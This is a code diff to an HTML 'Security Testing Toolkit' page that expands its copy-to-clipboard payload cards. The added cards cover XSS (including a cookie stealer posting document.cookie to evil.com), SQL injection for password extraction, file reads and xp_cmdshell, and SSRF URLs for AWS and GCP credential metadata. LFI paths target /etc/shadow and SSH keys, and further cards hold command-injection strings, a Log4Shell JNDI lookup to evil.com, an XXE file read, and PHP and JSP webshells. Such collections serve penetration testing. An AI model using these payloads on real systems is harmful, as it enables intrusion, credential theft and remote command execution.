@@ -17,7 +17,7 @@
                     <p class="subtitle">Security Testing Toolkit</p>
                 </div>
             </div>
-            <div class="version-badge">v1.0.1</div>
+            <div class="version-badge">v1.1.1</div>
         </header>
 
         <nav class="tab-navigation">
@@ -53,7 +53,7 @@
             <section class="payload-section active" id="xss">
                 <div class="section-header">
                     <h2 class="section-title">Cross-Site Scripting (XSS)</h2>
-                    <span class="payload-count">6 payloads</span>
+                    <span class="payload-count">15 payloads</span>
                 </div>
                 
                 <div class="payload-grid">
@@ -110,13 +110,94 @@
                         <code class="payload-code">'&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code>
                         <div class="payload-description">Character code encoding to bypass filters</div>
                     </div>
+
+                    <div class="payload-card" data-payload='<body onload=alert(1)>'>
+                        <div class="payload-header">
+                            <h3 class="payload-name">Body Onload</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">&lt;body onload=alert(1)&gt;</code>
+                        <div class="payload-description">Body tag with onload event</div>
+                    </div>
+
+                    <div class="payload-card" data-payload='<input autofocus onfocus=alert(1)>'>
+                        <div class="payload-header">
+                            <h3 class="payload-name">Input Autofocus</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">&lt;input autofocus onfocus=alert(1)&gt;</code>
+                        <div class="payload-description">Input element with automatic focus trigger</div>
+                    </div>
+
+                    <div class="payload-card" data-payload='<select onfocus=alert(1) autofocus>'>
+                        <div class="payload-header">
+                            <h3 class="payload-name">Select Autofocus</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">&lt;select onfocus=alert(1) autofocus&gt;</code>
+                        <div class="payload-description">Select element with focus-based XSS</div>
+                    </div>
+
+                    <div class="payload-card" data-payload='<textarea autofocus onfocus=alert(1)>'>
+                        <div class="payload-header">
+                            <h3 class="payload-name">Textarea Focus</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">&lt;textarea autofocus onfocus=alert(1)&gt;</code>
+                        <div class="payload-description">Textarea with automatic focus XSS</div>
+                    </div>
+
+                    <div class="payload-card" data-payload='<video><source onerror="javascript:alert(1)">'>
+                        <div class="payload-header">
+                            <h3 class="payload-name">Video Source Error</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">&lt;video&gt;&lt;source onerror="javascript:alert(1)"&gt;</code>
+                        <div class="payload-description">Video source error handler XSS</div>
+                    </div>
+
+                    <div class="payload-card" data-payload='<audio src=x onerror=alert(1)>'>
+                        <div class="payload-header">
+                            <h3 class="payload-name">Audio Error</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">&lt;audio src=x onerror=alert(1)&gt;</code>
+                        <div class="payload-description">Audio element error-based XSS</div>
+                    </div>
+
+                    <div class="payload-card" data-payload='<details open ontoggle=alert(1)>'>
+                        <div class="payload-header">
+                            <h3 class="payload-name">Details Toggle</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">&lt;details open ontoggle=alert(1)&gt;</code>
+                        <div class="payload-description">Details element with toggle event</div>
+                    </div>
+
+                    <div class="payload-card" data-payload='<marquee onstart=alert(1)>'>
+                        <div class="payload-header">
+                            <h3 class="payload-name">Marquee Start</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">&lt;marquee onstart=alert(1)&gt;</code>
+                        <div class="payload-description">Marquee element with start event</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="<script>document.location='http://evil.com/'+document.cookie</script>">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Cookie Stealer</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">&lt;script&gt;document.location='http://evil.com/'+document.cookie&lt;/script&gt;</code>
+                        <div class="payload-description">Cookie stealing XSS payload</div>
+                    </div>
                 </div>
             </section>
 
             <section class="payload-section" id="sqli">
                 <div class="section-header">
                     <h2 class="section-title">SQL Injection</h2>
-                    <span class="payload-count">6 payloads</span>
+                    <span class="payload-count">15 payloads</span>
                 </div>
                 
                 <div class="payload-grid">
@@ -173,13 +254,94 @@
                         <code class="payload-code">' OR SLEEP(5)--</code>
                         <div class="payload-description">Time delay for blind SQL injection</div>
                     </div>
+
+                    <div class="payload-card" data-payload="' UNION SELECT @@version--">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Version Detection</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">' UNION SELECT @@version--</code>
+                        <div class="payload-description">Extract database version information</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="' UNION SELECT user()--">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Current User</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">' UNION SELECT user()--</code>
+                        <div class="payload-description">Get current database user</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="' UNION SELECT database()--">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Current Database</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">' UNION SELECT database()--</code>
+                        <div class="payload-description">Extract current database name</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="' UNION SELECT table_name FROM information_schema.tables--">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Table Names</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">' UNION SELECT table_name FROM information_schema.tables--</code>
+                        <div class="payload-description">Enumerate all table names</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="' UNION SELECT column_name FROM information_schema.columns--">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Column Names</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">' UNION SELECT column_name FROM information_schema.columns--</code>
+                        <div class="payload-description">Enumerate column names</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Boolean Blind</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--</code>
+                        <div class="payload-description">Boolean-based blind SQL injection</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="' UNION SELECT LOAD_FILE('/etc/passwd')--">
+                        <div class="payload-header">
+                            <h3 class="payload-name">File Read</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">' UNION SELECT LOAD_FILE('/etc/passwd')--</code>
+                        <div class="payload-description">Read local files via SQL injection</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="'; EXEC xp_cmdshell('whoami')--">
+                        <div class="payload-header">
+                            <h3 class="payload-name">MSSQL Command</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">'; EXEC xp_cmdshell('whoami')--</code>
+                        <div class="payload-description">MSSQL command execution</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="' UNION SELECT extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Error-based MySQL</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">' UNION SELECT extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--</code>
+                        <div class="payload-description">MySQL error-based information extraction</div>
+                    </div>
                 </div>
             </section>
 
             <section class="payload-section" id="ssrf">
                 <div class="section-header">
                     <h2 class="section-title">Server-Side Request Forgery</h2>
-                    <span class="payload-count">5 payloads</span>
+                    <span class="payload-count">12 payloads</span>
                 </div>
                 
                 <div class="payload-grid">
@@ -227,13 +389,76 @@
                         <code class="payload-code">http://0.0.0.0:80</code>
                         <div class="payload-description">Access all interfaces via null route</div>
                     </div>
+
+                    <div class="payload-card" data-payload="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+                        <div class="payload-header">
+                            <h3 class="payload-name">AWS IAM Credentials</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>
+                        <div class="payload-description">AWS IAM security credentials</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="http://metadata.google.internal/computeMetadata/v1/">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Google Cloud Metadata</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">http://metadata.google.internal/computeMetadata/v1/</code>
+                        <div class="payload-description">Google Cloud instance metadata</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="http://[::1]:80">
+                        <div class="payload-header">
+                            <h3 class="payload-name">IPv6 Localhost</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">http://[::1]:80</code>
+                        <div class="payload-description">IPv6 loopback address</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="http://10.0.0.1">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Private Network</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">http://10.0.0.1</code>
+                        <div class="payload-description">Common private network gateway</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="http://192.168.1.1">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Router Access</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">http://192.168.1.1</code>
+                        <div class="payload-description">Common router/gateway address</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="dict://localhost:11211/stats">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Memcached Dict</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">dict://localhost:11211/stats</code>
+                        <div class="payload-description">Dict protocol to access Memcached</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="http://127.0.0.1:6379">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Redis Access</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">http://127.0.0.1:6379</code>
+                        <div class="payload-description">Redis database default port</div>
+                    </div>
                 </div>
             </section>
 
             <section class="payload-section" id="lfi">
                 <div class="section-header">
                     <h2 class="section-title">Local File Inclusion</h2>
-                    <span class="payload-count">5 payloads</span>
+                    <span class="payload-count">12 payloads</span>
                 </div>
                 
                 <div class="payload-grid">
@@ -281,13 +506,76 @@
                         <code class="payload-code">php://filter/convert.base64-encode/resource=index.php</code>
                         <div class="payload-description">PHP filter for source code disclosure</div>
                     </div>
+
+                    <div class="payload-card" data-payload="../../../etc/shadow">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Shadow File</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">../../../etc/shadow</code>
+                        <div class="payload-description">Linux shadow password file</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="/var/log/apache2/access.log">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Apache Access Log</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">/var/log/apache2/access.log</code>
+                        <div class="payload-description">Apache web server access log</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="php://input">
+                        <div class="payload-header">
+                            <h3 class="payload-name">PHP Input Stream</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">php://input</code>
+                        <div class="payload-description">PHP input stream for POST data</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="data://text/plain,<?php system($_GET['cmd']); ?>">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Data Wrapper</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">data://text/plain,<?php system($_GET['cmd']); ?></code>
+                        <div class="payload-description">Data wrapper for code execution</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="zip://shell.jpg%23shell.php">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Zip Wrapper</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">zip://shell.jpg%23shell.php</code>
+                        <div class="payload-description">Zip wrapper for embedded files</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="/proc/version">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Kernel Version</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">/proc/version</code>
+                        <div class="payload-description">Linux kernel version information</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="/home/user/.ssh/id_rsa">
+                        <div class="payload-header">
+                            <h3 class="payload-name">SSH Private Key</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">/home/user/.ssh/id_rsa</code>
+                        <div class="payload-description">SSH private key file</div>
+                    </div>
                 </div>
             </section>
 
             <section class="payload-section" id="other">
                 <div class="section-header">
                     <h2 class="section-title">Other Vulnerabilities</h2>
-                    <span class="payload-count">5 payloads</span>
+                    <span class="payload-count">15 payloads</span>
                 </div>
                 
                 <div class="payload-grid">
@@ -334,6 +622,96 @@
                         </div>
                         <code class="payload-code">../admin</code>
                         <div class="payload-description">Simple directory traversal</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="${{7*7}}">
+                        <div class="payload-header">
+                            <h3 class="payload-name">JSP Expression</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">${{7*7}}</code>
+                        <div class="payload-description">JSP expression language injection</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="{{config.items()}}">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Flask Config</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">{{config.items()}}</code>
+                        <div class="payload-description">Flask configuration disclosure</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="& whoami">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Command Chain</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">& whoami</code>
+                        <div class="payload-description">Command chaining with ampersand</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="| id">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Pipe Command</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">| id</code>
+                        <div class="payload-description">Command piping for injection</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="`whoami`">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Backtick Execution</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">`whoami`</code>
+                        <div class="payload-description">Command substitution with backticks</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="$(whoami)">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Subshell Execution</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">$(whoami)</code>
+                        <div class="payload-description">Command substitution with subshell</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="${jndi:ldap://evil.com:1389/a}">
+                        <div class="payload-header">
+                            <h3 class="payload-name">Log4j JNDI</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">${jndi:ldap://evil.com:1389/a}</code>
+                        <div class="payload-description">Log4Shell JNDI injection</div>
+                    </div>
+
+                    <div class="payload-card" data-payload='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'>
+                        <div class="payload-header">
+                            <h3 class="payload-name">XXE Injection</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&xxe;&lt;/foo&gt;</code>
+                        <div class="payload-description">XML External Entity injection</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="<?php system($_GET['cmd']); ?>">
+                        <div class="payload-header">
+                            <h3 class="payload-name">PHP Webshell</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">&lt;?php system($_GET['cmd']); ?&gt;</code>
+                        <div class="payload-description">Simple PHP webshell code</div>
+                    </div>
+
+                    <div class="payload-card" data-payload="<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>">
+                        <div class="payload-header">
+                            <h3 class="payload-name">JSP Webshell</h3>
+                            <div class="copy-button">📋</div>
+                        </div>
+                        <code class="payload-code">&lt;% Runtime.getRuntime().exec(request.getParameter("cmd")); %&gt;</code>
+                        <div class="payload-description">JSP webshell command execution</div>
                     </div>
                 </div>
             </section>
